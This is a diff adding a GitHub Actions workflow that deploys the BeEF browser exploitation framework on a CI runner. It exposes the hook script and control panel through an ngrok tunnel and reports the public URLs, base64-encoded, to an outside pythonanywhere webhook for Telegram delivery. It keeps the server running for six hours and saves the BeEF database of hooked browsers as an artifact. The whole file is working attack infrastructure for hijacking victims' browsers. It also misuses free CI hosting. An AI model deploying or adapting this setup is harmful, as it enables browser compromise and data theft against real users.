@@ -1,0 +1,56 @@
+name: BeEF Telegram Bot
+on: [workflow_dispatch]
+
+jobs:
+  run-beef:
+    runs-on: ubuntu-latest
+    steps:
+      - name: Checkout
+        uses: actions/checkout@v3
+
+      - name: Setup Environment
+        run: |
+          sudo apt update
+          sudo apt install -y ruby-full libsqlite3-dev jq
+          git clone https://github.com/beefproject/beef.git
+          cd beef
+          sed -i 's/passwd: "beef"/passwd: "Giang_Vip_2026"/' config.yaml
+          bundle install
+
+      - name: Install Ngrok
+        run: |
+          curl -s https://ngrok-agent.s3.amazonaws.com/ngrok.asc | sudo tee /etc/apt/trusted.gpg.d/ngrok.asc >/dev/null
+          echo "deb https://ngrok-agent.s3.amazonaws.com buster main" | sudo tee /etc/apt/sources.list.d/ngrok.list
+          sudo apt update && sudo apt install ngrok
+
+      - name: Start BeEF & Notify Telegram
+        env:
+          NGROK_AUTH_TOKEN: ${{ secrets.NGROK_AUTH_TOKEN }}
+        run: |
+          ngrok config add-authtoken $NGROK_AUTH_TOKEN
+          
+          # 1. Khởi động BeEF ngầm
+          cd beef && ./beef & 
+          sleep 10 # Chờ BeEF khởi động xong
+          
+          # 2. Khởi động Ngrok ngầm
+          ngrok http 3000 > /dev/null &
+          sleep 5 # Chờ Ngrok lấy link
+          
+          # 3. Lấy Public URL từ Ngrok API
+          PUBLIC_URL=$(curl -s http://localhost:4040/api/tunnels | jq -r '.tunnels[0].public_url')
+          
+          # 4. Gửi link về Telegram qua Webhook của bạn
+          # Nội dung được mã hóa Base64 để tránh lỗi ký tự đặc biệt
+          MSG=$(echo -n "🚀 BeEF Online! Link Hook: $PUBLIC_URL/hook.js | Panel: $PUBLIC_URL/ui/panel" | base64)
+          curl -s "https://webhook1234.pythonanywhere.com/?data=$MSG"
+          
+          # 5. Giữ Workflow chạy (GitHub cho phép tối đa 6h)
+          sleep 21600 
+
+      - name: Save Backup
+        if: always()
+        uses: actions/upload-artifact@v4
+        with:
+          name: beef-database
+          path: beef/beef.db
